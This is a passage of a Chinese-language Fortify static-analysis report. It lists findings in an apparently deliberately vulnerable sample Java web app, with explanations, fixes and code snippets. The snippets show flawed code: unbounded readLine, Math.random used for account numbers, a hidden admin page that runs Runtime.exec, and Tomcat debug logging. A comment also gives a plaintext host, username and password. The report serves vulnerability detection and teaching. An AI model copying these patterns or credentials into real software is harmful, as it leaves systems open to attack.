                                <Value>攻击者可能通过对应用程序发送大量请求，而使它拒绝对合法用户的服务，但是这种攻击形式经常会在网络层就被排除掉了。更加严重的是那些只需要使用少量请求就可以使得攻击者让应用程序过载的 bug。这种 bug 允许攻击者去指定请求使用系统资源的数量，或者是持续使用这些系统资源的时间。

示例 1：通过以下代码，用户可以指定线程处于休眠状态的时长。通过指定一个较大的数值，攻击者可以无限期地占用该线程。因此，只需少量的请求，攻击者就能耗尽应用程序的线程池。


  int usrSleepTime = Integer.parseInt(usrInput);
  Thread.sleep(usrSleepTime);


示例 2：以下代码从一个 zip 文件中读取字符串。因为它使用 readLine() 方法，所以可以读取一批极大量的输入。攻击者能够利用该代码引发一个 OutOfMemoryException 异常，或者消耗大量的内存，从而致使程序需要更多的时间去执行垃圾信息的收集，或在随后的操作过程中用完内存资源。


  InputStream zipInput = zipFile.getInputStream(zipEntry);
  Reader zipReader = new InputStreamReader(zipInput);
  BufferedReader br = new BufferedReader(zipReader);
  String line = br.readLine();
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>校验用户输入以确保它不会引起不适当的资源利用。

示例 3：以下代码允许用户指定线程休眠的时间量，就像Example 1 中一样，但前提是该值处于合理范围内。

  int usrSleepTime = Integer.parseInt(usrInput);
  if (usrSleepTime &gt;= SLEEP_MIN &amp;&amp;
      usrSleepTime &lt;= SLEEP_MAX) {
    Thread.sleep(usrSleepTime);
  } else {
    throw new Exception("Invalid sleep duration");
  }
}


示例 4：以下代码会从 zip 文件中读取字符串，就像在Example 2 中一样，但它读取的最大字符串长度为 MAX_STR_LEN 个字符。

  InputStream zipInput = zipFile.getInputStream(zipEntry);
  Reader zipReader = new InputStreamReader(zipInput);
  BufferedReader br = new BufferedReader(zipReader);
  StringBuffer sb = new StringBuffer();
  int intC;
  while ((intC = br.read()) != -1) {
    char c = (char) intC;
    if (c == '\n') {
      break;
    }
    if (sb.length() &gt;= MAX_STR_LEN) {
      throw new Exception("input too long");
    }
    sb.append(c);
  }
  String line = sb.toString();
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 即使消耗的系统资源总量或持续使用这些系统资源的时间未被黑客控制或至少未被直接控制，仍有可能发生 Denial of service。相反，程序员可能选择不安全的常量指定这些参数。Fortify 安全编码规则包会将此类情况作为潜在 Denial of Service 漏洞报告。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="AB2F066EC69A2EE657688242A8EE34B5" ruleID="24023E22-D6C7-4D5C-B049-38B7EFC8B408">
                            <Category>Denial of Service</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>调用 Backup.jsp 中第 11 行的 readLine() 可能会使攻击者造成程序崩溃或让合法用户无法进行使用。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>Backup.jsp</FileName>
                                <FilePath>pages/Backup.jsp</FilePath>
                                <LineStart>11</LineStart>
                                <Snippet>    java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(fi));
    String data;
    while ((data = r.readLine()) != null) {
      p_out.print(data + "\n");
     }</Snippet>
                                <TargetFunction>readLine()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C94E27BFCBB27644F49196FC949099A1" ruleID="24023E22-D6C7-4D5C-B049-38B7EFC8B408">
                            <Category>Denial of Service</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>调用 FilesViewer.jsp 中第 13 行的 readLine() 可能会使攻击者造成程序崩溃或让合法用户无法进行使用。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>FilesViewer.jsp</FileName>
                                <FilePath>pages/FilesViewer.jsp</FilePath>
                                <LineStart>13</LineStart>
                                <Snippet>		String line = null;
		while(true) {
			line = reader.readLine();
			if ( null == line ) break;
			out.println(line);</Snippet>
                                <TargetFunction>readLine()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9E5EC5F104F0F5355572193C89EC79EB" ruleID="24023E22-D6C7-4D5C-B049-38B7EFC8B408">
                            <Category>Denial of Service</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>调用 hidden_AdminControl.jsp 中第 97 行的 readLine() 可能会使攻击者造成程序崩溃或让合法用户无法进行使用。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>hidden_AdminControl.jsp</FileName>
                                <FilePath>pages/common/hidden_AdminControl.jsp</FilePath>
                                <LineStart>97</LineStart>
                                <Snippet>			 Process p = Runtime.getRuntime().exec(runtimeCommand);
			 BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
			 while((s = sI.readLine()) != null)
			 {
				output += s;</Snippet>
                                <TargetFunction>readLine()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Hidden Field</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>在 Check.jsp 中第 48 行上使用了隐藏表单字段。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>程序员通常信任隐藏字段的内容，认为用户不会查看它们或操作其内容。攻击者则会推翻这些假设。他们将检查写入隐藏字段的值，更改它们，或使用攻击数据替换这些内容。

示例：类型为 hidden 的 &lt;input&gt; 标签表示使用了隐藏字段。

&lt;input type="hidden"&gt;


如果隐藏字段包含敏感信息，那么就会像捕捉该页面的其余部分一样捕捉这些信息。这会导致敏感信息在用户不知情的情况下在浏览器缓存中被隐藏起来。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>注意攻击者将研究应用程序中使用的所有隐藏字段并对其进行解码。将隐藏字段视为不可信赖的输入。如果信息不能和页面其余部分一起缓存，不要在隐藏字段中存储这些信息。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="27560BED23D75F315D92BB3405D76157" ruleID="608B6ED6-EDFE-47C3-9D6E-6A1A97582DEB">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>在 FindLocations.jsp 中第 237 行上使用了隐藏表单字段。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>FindLocations.jsp</FileName>
                                <FilePath>pages/content/FindLocations.jsp</FilePath>
                                <LineStart>237</LineStart>
                                <Snippet>                            &lt;/td&gt;
                        &lt;/tr&gt;
                        &lt;s:hidden name="type" value="branch" /&gt;
                    &lt;/s:form&gt;
                &lt;/table&gt;</Snippet>
                                <TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="27560BED23D75F315D92BB3405D76156" ruleID="608B6ED6-EDFE-47C3-9D6E-6A1A97582DEB">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>在 FindLocations.jsp 中第 126 行上使用了隐藏表单字段。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>FindLocations.jsp</FileName>
                                <FilePath>pages/content/FindLocations.jsp</FilePath>
                                <LineStart>126</LineStart>
                                <Snippet>                            &lt;/td&gt;
                        &lt;/tr&gt;
                        &lt;s:hidden name="type" value="atm" /&gt;
                    &lt;/s:form&gt;
                &lt;/table&gt;</Snippet>
                                <TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AE866A63EC09BD0D616073326DC39734" ruleID="811489B8-AA5B-494C-9074-926A810A1421">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>在 Check.jsp 中第 48 行上使用了隐藏表单字段。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>Check.jsp</FileName>
                                <FilePath>pages/content/Check.jsp</FilePath>
                                <LineStart>48</LineStart>
                                <Snippet>                            &lt;tr&gt;
                                &lt;td colspan="6" class="dataCell alt" align="center"&gt;
				   &lt;input type="HiDdEn" name="acct" value="&lt;c:out value="${account}"/&gt;"/&gt;
                                   &lt;s:submit value="Submit"/&gt;
                                &lt;/td&gt;</Snippet>
                                <TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Insecure Randomness</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>由 nextInt() 实施的随机数生成器不能抵挡加密攻击。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>在对安全性要求较高的环境中，使用能够生成可预测值的函数作为随机数据源，会产生 Insecure Randomness 错误。

电脑是一种具有确定性的机器，因此不可能产生真正的随机性。伪随机数生成器 (PRNG) 近似于随机算法，始于一个能计算后续数值的种子。

PRNG 包括两种类型：统计学的 PRNG 和密码学的 PRNG。统计学的 PRNG 提供很多有用的统计属性，但其输出结果很容易预测，因此容易复制数值流。在安全性所依赖的生成值不可预测的情况下，这种类型并不适用。密码学的 PRNG 生成的输出结果较难预测，可解决这一问题。为保证值的加密安全性，必须使攻击者根本无法、或几乎不可能鉴别生成的随机值和真正的随机值。通常情况下，如果并未声明 PRNG 算法带有加密保护，那么它很可能就是统计学的 PRNG，因此不应在对安全性要求较高的环境中使用，否则会导致严重的漏洞（如易于猜测的密码、可预测的加密密钥、Session Hijacking 和 DNS Spoofing）。

示例： 下面的代码可利用统计学的 PRNG 为购买产品后仍在有效期内的收据创建一个 URL。


String GenerateReceiptURL(String baseUrl) {
    Random ranGen = new Random();
    ranGen.setSeed((new Date()).getTime());
    return (baseUrl + ranGen.nextInt(400000000) + ".html");
}


这段代码使用 Random.nextInt() 函数为它生成的收据页面生成“唯一”的标识符。由于 Random.nextInt() 是统计学的 PRNG，攻击者很容易猜到其生成的字符串。尽管收据系统的底层设计并不完善，但若使用不会生成可预测收据标识符的随机数生成器（如密码学的 PRNG），就会更安全些。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>当不可预测性至关重要时，如大多数对安全性要求较高的环境都采用随机性，这时可以使用密码学的 PRNG。不管选择了哪一种 PRNG，都要始终使用带有充足熵的数值作为该算法的种子。（切勿使用诸如当前时间之类的数值，因为它们只提供很小的熵。）

Java 语言在 java.security.SecureRandom 中提供了一个加密 PRNG。就像 java.security 中其他以算法为基础的类那样，SecureRandom 提供了与某个特定算法集合相关的包，该包可以独立实现。当使用 SecureRandom.getInstance() 请求一个 SecureRandom 实例时，您可以申请实现某个特定的算法。如果算法可行，那么您可以将它作为 SecureRandom 的对象使用。如果算法不可行，或者您没有为算法明确特定的实现方法，那么会由系统为您选择 SecureRandom 的实现方法。

Sun 在名为 SHA1PRNG 的 Java 版本中提供了一种单独实现 SecureRandom 的方式，Sun 将其描述为计算：

“SHA-1 可以计算一个真实的随机种子参数的散列值，同时，该种子参数带有一个 64 比特的计算器，会在每一次操作后加 1。在 160 比特的 SHA-1 输出中，只能使用 64 比特的输出 [1]。”

然而，文档中有关 Sun 的 SHA1PRNG 算法实现细节的相关记录很少，人们无法了解算法实现中使用的熵的来源，因此也并不清楚输出中到底存在多少真实的随机数值。尽管有关 Sun 的实现方法网络上有各种各样的猜测，但是有一点无庸置疑，即算法具有很强的加密性，可以在对安全性极为敏感的各种内容中安全地使用。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="DC248189F1E49D12D24E147C735E23CF" ruleID="49D75ADD-4BBD-49B9-AAF2-92B9BAB332FE">
                            <Category>Insecure Randomness</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>由 nextInt() 实施的随机数生成器不能抵挡加密攻击。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>error.jsp</FileName>
                                <FilePath>pages/error.jsp</FilePath>
                                <LineStart>9</LineStart>
                                <Snippet>&lt;% java.util.Random r = new java.util.Random(); %&gt;
&lt;h1&gt;
    An Error has occurred. Please contact your sys admin. Error code: &lt;%= r.nextInt() + "" %&gt; . Page: ${pageContext.request.requestURI}.
&lt;/h1&gt;
Date stamp: &lt;%= d.toString() %&gt;.</Snippet>
                                <TargetFunction>nextInt()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FD54E88F730C71B60F5204723852D5F5" ruleID="57E7AB18-082F-4C18-8DE1-4115DB3917A3">
                            <Category>Insecure Randomness</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>由 random() 实施的随机数生成器不能抵挡加密攻击。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>PerformRegistration.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/PerformRegistration.java</FilePath>
                                <LineStart>121</LineStart>
                                <Snippet>			for(int i =0; i&lt;16; i++)
			{
				ccnumber += new Double(Math.floor(Math.random() * 10)).intValue();
			}
		}while(!isValid(ccnumber));</Snippet>
                                <TargetFunction>random()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6E570D464B87368F0F9D6CAB1D134FCE" ruleID="57E7AB18-082F-4C18-8DE1-4115DB3917A3">
                            <Category>Insecure Randomness</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>由 random() 实施的随机数生成器不能抵挡加密攻击。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>PerformRegistration.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/PerformRegistration.java</FilePath>
                                <LineStart>106</LineStart>
                                <Snippet>		for(int i =0; i&lt;10; i++)
		{
			account += new Double(Math.floor(Math.random() * 10)).intValue();
		}
</Snippet>
                                <TargetFunction>random()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>J2EE Bad Practices: Leftover Debug Code</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>类 SendMail 包含调试代码，它可以在部署的 web 应用程序中建立一些意想不到的入口点。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>开发过程中一般会为了调试和测试目的增加一些“后门”代码，这些代码不会随应用程序一起提供或部署。如果这类调试代码无意中被保留在应用程序中，则会导致应用程序向计划外的交互模式开放。这些后门入口点很容易产生安全隐患，因为它们不在当初的设计或者测试的考虑之内，并且不会出现在应用程序设计中的操作环境里。

遗忘调试代码中最常见例子出现在 web 应用程序中的 main() 方法。尽管这在产品的开发过程中是完全可以接受的，但是属于 J2EE 应用程序中的那部分类不应该定义 main()。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>务必在部署应用程序的产品版之前删除调试代码。无论是否存在直接的安全威胁，一旦早期开发阶段结束，就没有任何理由将这样的代码保留在应用程序中。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 出现方法 main() 可能预示着一个十分严重安全问题。在查找调用 main() 的操作时，请检查是否存在其他迹象，表明开发者编程时过于仓促，或者出于其他情况没能正常地结束工作。

2. 如果您审计一个非 J2EE Java 应用程序，J2EE Bad Practices 分类可能不适用于您的环境。在这种情况下，您可以使用 AuditGuide 来消除这些问题。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="44B4F756ABA9F608B9DCBA52F8BA6928" ruleID="625EEE1F-464F-42DC-85D6-269A637EF747">
                            <Category>J2EE Bad Practices: Leftover Debug Code</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>类 SendMail 包含调试代码，它可以在部署的 web 应用程序中建立一些意想不到的入口点。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>SendMail.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/legacy/mail/SendMail.java</FilePath>
                                <LineStart>37</LineStart>
                                <Snippet>
    //Stub class to send mail.
    public static void main(String args[])
    {
</Snippet>
                                <TargetFunction>Function: main()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="51459A7195AD3C4E4B6A1C6AD0139F3F" ruleID="625EEE1F-464F-42DC-85D6-269A637EF747">
                            <Category>J2EE Bad Practices: Leftover Debug Code</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>类 BannerAdClient 包含调试代码，它可以在部署的 web 应用程序中建立一些意想不到的入口点。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>BannerAdClient.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/webservices/BannerAdClient.java</FilePath>
                                <LineStart>63</LineStart>
                                <Snippet>

    public static void main(String[] args)

	{</Snippet>
                                <TargetFunction>Function: main()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A227EBF38A11EEE7A4E7DF359FEAF99C" ruleID="625EEE1F-464F-42DC-85D6-269A637EF747">
                            <Category>J2EE Bad Practices: Leftover Debug Code</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>类 BannerAdServer 包含调试代码，它可以在部署的 web 应用程序中建立一些意想不到的入口点。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>BannerAdServer.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/webservices/BannerAdServer.java</FilePath>
                                <LineStart>39</LineStart>
                                <Snippet>

	public static void main(String args[])

	{</Snippet>
                                <TargetFunction>Function: main()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>J2EE Misconfiguration: Debug Information</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>当 Tomcat 调试级别在 3 级或以上时，可能会把敏感数据（包括密码）写入日志文件。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>如果您正在使用 Tomcat 执行身份验证，Tomcat 部署描述符文件会指定一个用于身份验证的“Realm”。它类似于以下内容：

示例：

  &lt;Realm className="org.apache.catalina.realm.JAASRealm"
         appName="SRN"
         userClassNames="com.srn.security.UserPrincipal"
         roleClassNames="com.srn.security.RolePrincipal"/&gt;


此 Realm 标签可采用一个名为 debug 的可选属性，用来指示日志级别。此数值越大，日志消息越详细。如果此调试级别设置得过高，Tomcat 会将所有用户名和密码以明文形式写入日志文件中。Tomcat JAASRealm 的相关调试消息的临界值为 3（3 或更大表示不合适，2 或更小表示合适），但该临界值会因 Tomcat 提供的 Realm 类型不同而有所不同。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>在生产环境中请不要为 Realm 指定 debug 属性。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="160165ED8AFED9ECCE44607334968E16" ruleID="A3AFECB0-9BC2-497A-8FB5-01BF0E4F1CB5">
                            <Category>J2EE Misconfiguration: Debug Information</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>当 Tomcat 调试级别在 3 级或以上时，可能会把敏感数据（包括密码）写入日志文件。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>context.xml</FileName>
                                <FilePath>etc/tomcat5.5-support/context.xml</FilePath>
                                <LineStart>12</LineStart>
                                <Snippet>        localDataSource="true" dataSourceName="jdbc/riches"
        userTable="profile" userNameCol="username" userCredCol="password"
        userRoleTable="role" roleNameCol="rolename"/&gt;

	&lt;!-- NOTE: you can NOT use a &lt;ResourceParams&gt; tag with nested &lt;parameter&gt;&lt;name&gt;...&lt;/name&gt;&lt;value&gt;...&lt;/value&gt;&lt;/parameter&gt;</Snippet>
                                <TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="160165ED8AFED9ECCE44607334968E15" ruleID="A3AFECB0-9BC2-497A-8FB5-01BF0E4F1CB5">
                            <Category>J2EE Misconfiguration: Debug Information</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>当 Tomcat 调试级别在 3 级或以上时，可能会把敏感数据（包括密码）写入日志文件。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>context.xml</FileName>
                                <FilePath>context.xml</FilePath>
                                <LineStart>12</LineStart>
                                <Snippet>        localDataSource="true" dataSourceName="jdbc/riches"
        userTable="profile" userNameCol="username" userCredCol="password"
        userRoleTable="role" roleNameCol="rolename"/&gt;

    &lt;Resource name="jdbc/riches" auth="Container" type="javax.sql.DataSource"/&gt;</Snippet>
                                <TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3D5FFE856F265EEC3F1362E7626F71B1" ruleID="A3AFECB0-9BC2-497A-8FB5-01BF0E4F1CB5">
                            <Category>J2EE Misconfiguration: Debug Information</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>当 Tomcat 调试级别在 3 级或以上时，可能会把敏感数据（包括密码）写入日志文件。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>tomcat5_server.xml</FileName>
                                <FilePath>config/tomcat5_server.xml</FilePath>
                                <LineStart>429</LineStart>
                                <Snippet>         roleClassNames="com.fortify.samples.riches.security.RolePrincipal"

		 debug = "3"/&gt;

		 </Snippet>
                                <TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Password Management: Password in Comment</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>以明文形式在系统或系统代码中存储密码或密码详细信息可能会以无法轻松修复的方式危及系统安全。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>使用硬编码方式处理密码绝非好方法。在注释中存储密码详细信息等同于对密码进行硬编码。这不仅会使所有项目开发人员都可以查看密码，而且还会使解决这一问题变得极其困难。在代码投入使用之后，密码便会外泄，除非对软件进行修补，否则将无法保护或更改密码。如果受密码保护的帐户遭受入侵，系统所有者将必须在安全性和可用性之间做出选择。


示例：以下注释指定连接到数据库的默认密码：


...
-- Default username for database connection is "scott"
-- Default password for database connection is "tiger"
...


该代码可以正常运行，但是有权访问该代码的任何人都能得到这个密码。一旦程序发布，除非修补该程序，否则可能无法更改数据库用户“scott”和密码“tiger”。雇员可以利用手中掌握的信息访问权限入侵系统。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>绝不能对密码进行硬编码。通常情况下，应对密码加以模糊化，并在外部资源文件中进行管理。在系统中采用明文的形式存储密码，会造成任何有充分权限的人读取和无意中误用密码。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="0E1DF2DE004C630D5CC1109D215F1073" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>以明文形式在系统或系统代码中存储密码或密码详细信息可能会以无法轻松修复的方式危及系统安全。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ProfileService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/ProfileService.java</FilePath>
                                <LineStart>11</LineStart>
                                <Snippet>{
    // NOTE: sample profiles can be reproduced through internal server
    // host: db1.riches.com; username: service, password: passw0rd1!

    public static final int SUCCESS = 0;</Snippet>
                                <TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B60A502E13B6720D1E65DC607990997C" ruleID="AE3EEC5E-9731-466C-9BDF-4A0D302B0725">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>以明文形式在系统或系统代码中存储密码或密码详细信息可能会以无法轻松修复的方式危及系统安全。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>create_db.sql</FileName>
                                <FilePath>create_db.sql</FilePath>
                                <LineStart>3</LineStart>
                                <Snippet>SET PROPERTY "sql.enforce_strict_size" true;

-- [Sam]: I don't know why, if I use 'password', it will still be converted to uppercase
ALTER USER "sa" SET PASSWORD 'PASSWORD';
</Snippet>
                                <TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1483212FE21E843DC765482817D6C30F" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>以明文形式在系统或系统代码中存储密码或密码详细信息可能会以无法轻松修复的方式危及系统安全。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>252</LineStart>
                                <Snippet>            profile.setPassword(new_pass);

	        //Try to hash the new password
	        try{
		        MessageDigest md = MessageDigest.getInstance("SHA-2");</Snippet>
                                <TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Redundant Null Check</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>AdminUtil.java 中的 isAdmin() 方法如果间接引用第 56 行上的 null 指针，将导致程序崩溃。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>如果不符合程序员的一个或多个假设，则通常会出现 null 指针异常。如果程序在检查可能为 null 的对象是否为 null 之前间接引用该对象，则会发生 check-after-dereference 错误。

